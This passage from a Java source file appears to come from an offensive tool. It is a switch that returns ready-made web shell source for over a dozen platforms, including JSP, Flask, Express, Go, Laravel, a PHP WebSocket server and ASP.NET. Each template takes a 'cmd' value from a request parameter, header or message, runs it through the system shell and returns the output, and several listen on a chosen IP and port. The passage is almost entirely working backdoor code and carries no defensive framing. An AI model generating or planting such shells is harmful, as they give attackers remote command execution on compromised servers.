                            "<html>\n" +
                            "<body>\n" +
                            "    <form method=\"get\">\n" +
                            "        Command: <input type=\"text\" name=\"cmd\">\n" +
                            "        <input type=\"submit\" value=\"Run\">\n" +
                            "    </form>\n" +
                            "    <pre>\n" +
                            "    <%%\n" +
                            "        String cmd = request.getParameter(\"cmd\");\n" +
                            "        if (cmd != null) {\n" +
                            "            Process p = Runtime.getRuntime().exec(cmd);\n" +
                            "            InputStream in = p.getInputStream();\n" +
                            "            BufferedReader br = new BufferedReader(new InputStreamReader(in));\n" +
                            "            String line;\n" +
                            "            while ((line = br.readLine()) != null) {\n" +
                            "                out.println(line);\n" +
                            "            }\n" +
                            "        }\n" +
                            "    %%>\n" +
                            "    </pre>\n" +
                            "</body>\n" +
                            "</html>"
            );



            case "ruby_sinatra" -> String.format(
                    "require 'sinatra'\n" +
                            "get '/shell' do\n" +
                            "    cmd = params['cmd']\n" +
                            "    output = `#{cmd}`\n" +
                            "    output\n" +
                            "end\n" +
                            "set :bind, '0.0.0.0'\n" +
                            "set :port, %d\n",
                    port
            );

            case "python_tornado" -> String.format(
                    "from tornado.web import RequestHandler\n" +
                            "import subprocess\n" +
                            "class ShellHandler(RequestHandler):\n" +
                            "    def get(self):\n" +
                            "        cmd = self.get_argument('cmd')\n" +
                            "        output = subprocess.check_output(cmd, shell=True, text=True)\n" +
                            "        self.write(output)\n" +
                            "app = tornado.web.Application([(r'/shell', ShellHandler)])\n" +
                            "app.listen(%d)\n" +
                            "tornado.ioloop.IOLoop.current().start()\n", port
            );

            case "coldfusion_basic" -> String.format(
                    "<cfset cmd = GetHttpRequestData().headers['cmd'] />\n" +
                            "<cfexecute name='cmd.exe' arguments='/c ' & cmd variable='output' timeout='10' />\n" +
                            "<cfoutput>#output#</cfoutput>"
            );

            case "perl_cgi" -> String.format(
                    "#!/usr/bin/perl\n" +
                            "use CGI;\n" +
                            "use strict;\n" +
                            "my $query = CGI->new;\n" +
                            "print $query->header;\n" +
                            "my $cmd = $query->param('cmd');\n" +
                            "print qx($cmd);"
            );

            case "rails_controller" -> String.format(
                    "class ShellController < ApplicationController\n" +
                            "  def run\n" +
                            "    cmd = params[:cmd]\n" +
                            "    render plain: `#{cmd}`\n" +
                            "  end\n" +
                            "end"
            );



            case "go_http" -> String.format(
                    "package main\n" +
                            "import (\n" +
                            "    \"net/http\"\n" +
                            "    \"os/exec\"\n" +
                            ")\n" +
                            "func handler(w http.ResponseWriter, r *http.Request) {\n" +
                            "    cmd := r.URL.Query().Get(\"cmd\")\n" +
                            "    output, _ := exec.Command(\"sh\", \"-c\", cmd).Output()\n" +
                            "    w.Write(output)\n" +
                            "}\n" +
                            "func main() {\n" +
                            "    http.HandleFunc(\"/shell\", handler)\n" +
                            "    http.ListenAndServe(\":%d\", nil)\n" +
                            "}\n",
                    port
            );


            case "python_flask" -> String.format(
                    "from flask import Flask, request\n" +
                            "import os\n" +
                            "app = Flask(__name__)\n" +
                            "@app.route('/shell')\n" +
                            "def shell():\n" +
                            "    cmd = request.args.get('cmd')\n" +
                            "    return os.popen(cmd).read()\n" +
                            "app.run(host='%s', port=%d)", ip, port
            );

            case "nodejs_express" -> String.format(
                    "const express = require('express');\n" +
                            "const app = express();\n" +
                            "app.get('/shell', (req, res) => {\n" +
                            "    const exec = require('child_process').exec;\n" +
                            "    exec(req.query.cmd, (err, stdout) => {\n" +
                            "        res.send(stdout);\n" +
                            "    });\n" +
                            "});\n" +
                            "app.listen(%d, '%s');", port, ip
            );

            case "java_springboot" -> String.format(
                    "import org.springframework.web.bind.annotation.*;\n" +
                            "import java.io.*;\n" +
                            "@RestController\n" +
                            "public class ShellController {\n" +
                            "    @RequestMapping(\"/shell\")\n" +
                            "    public String shell(@RequestParam String cmd) throws IOException {\n" +
                            "        Process process = new ProcessBuilder(\"cmd.exe\", \"/c\", cmd).start();\n" +
                            "        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n" +
                            "        StringBuilder output = new StringBuilder();\n" +
                            "        String line;\n" +
                            "        while ((line = reader.readLine()) != null) {\n" +
                            "            output.append(line + \"\\n\");\n" +
                            "        }\n" +
                            "        return output.toString();\n" +
                            "    }\n" +
                            "}\n"
            );

            case "php_laravel" -> String.format("<?php\n" +
                    "Route::get('/shell', function() {\n" +
                    "    $cmd = request()->query('cmd');\n" +
                    "    $output = shell_exec($cmd);\n" +
                    "    return response($output);\n" +
                    "});\n" +
                    "?>");


            case "php_websocket" -> String.format("<?php\n" +
                    "use Ratchet\\MessageComponentInterface;\n" +
                    "use Ratchet\\ConnectionInterface;\n" +
                    "require 'vendor/autoload.php';\n" +
                    "class Shell implements MessageComponentInterface {\n" +
                    "    public function onMessage(ConnectionInterface $conn, $msg) {\n" +
                    "        $output = shell_exec($msg);\n" +
                    "        $conn->send($output);\n" +
                    "    }\n" +
                    "    public function onOpen(ConnectionInterface $conn) {}\n" +
                    "    public function onClose(ConnectionInterface $conn) {}\n" +
                    "    public function onError(ConnectionInterface $conn, \\Exception $e) {\n" +
                    "        $conn->close();\n" +
                    "    }\n" +
                    "}\n" +
                    "use Ratchet\\Server\\IoServer;\n" +
                    "use Ratchet\\Server\\WsServer;\n" +
                    "use Ratchet\\Http\\HttpServer;\n" +
                    "use React\\Socket\\SocketServer;\n" +
                    "$server = new IoServer(new HttpServer(new WsServer(new Shell())), new SocketServer('%s:%d'));\n" +
                    "$server->run();\n" +
                    "?>", ip, port);


            case "asp_net" -> String.format(
                    "<%%@ Page Language=\"C#\" Debug=\"true\" %%>\n" +
                            "<%%@ Import Namespace=\"System.Diagnostics\" %%>\n" +
                            "<script runat=\"server\">\n" +
                            "    protected void Page_Load(object sender, EventArgs e) {\n" +
                            "        string cmd = Request[\"cmd\"];\n" +
                            "        if (!string.IsNullOrEmpty(cmd)) {\n" +
                            "            Process proc = new Process();\n" +
                            "            proc.StartInfo.FileName = \"cmd.exe\";\n" +
                            "            proc.StartInfo.Arguments = \"/c \" + cmd;\n" +
                            "            proc.StartInfo.UseShellExecute = false;\n" +
                            "            proc.StartInfo.RedirectStandardOutput = true;\n" +
                            "            proc.Start();\n" +
                            "            Response.Write(proc.StandardOutput.ReadToEnd());\n" +
                            "        }\n" +
                            "    }\n" +
                            "</script>"
            );


            default -> "Unsupported Web shell type";
        };
    }

}
